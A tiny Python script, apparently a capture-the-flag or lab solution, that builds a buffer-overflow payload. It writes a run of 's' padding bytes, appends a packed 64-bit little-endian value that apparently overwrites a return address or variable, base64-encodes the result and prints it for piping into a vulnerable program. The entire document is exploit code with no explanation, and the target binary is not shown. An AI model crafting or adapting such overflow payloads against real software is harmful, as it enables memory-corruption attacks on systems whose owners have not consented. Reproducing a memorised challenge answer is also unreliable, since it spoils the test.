
import sys
import struct
import base64

buf = b'sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'
buf += struct.pack('<Q', 1678002541640763451)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
